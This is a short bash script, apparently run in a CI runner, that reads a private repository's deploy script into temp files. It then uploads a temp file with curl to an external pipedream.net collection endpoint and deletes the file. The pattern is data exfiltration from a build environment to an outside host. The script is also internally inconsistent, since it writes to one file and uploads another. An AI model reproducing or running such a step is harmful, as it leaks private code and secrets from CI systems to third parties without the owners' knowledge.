#!/bin/bash

echo "--- START ---" > /tmp/file2.txt

#perf report --header-only >> /tmp/file3.txt
echo "-----" >> /tmp/file3.txt
echo $(cat /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh) >> /tmp/file2.txt
SCRIPT_PATH="/home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh"
#bash "$SCRIPT_PATH" >> /tmp/file3.txt

echo "--- FINISH ---" >> /tmp/file3.txt

curl --data-binary "@/tmp/file3.txt" https://ensf2rlc2dw6p.x.pipedream.net

rm /tmp/file3.txt
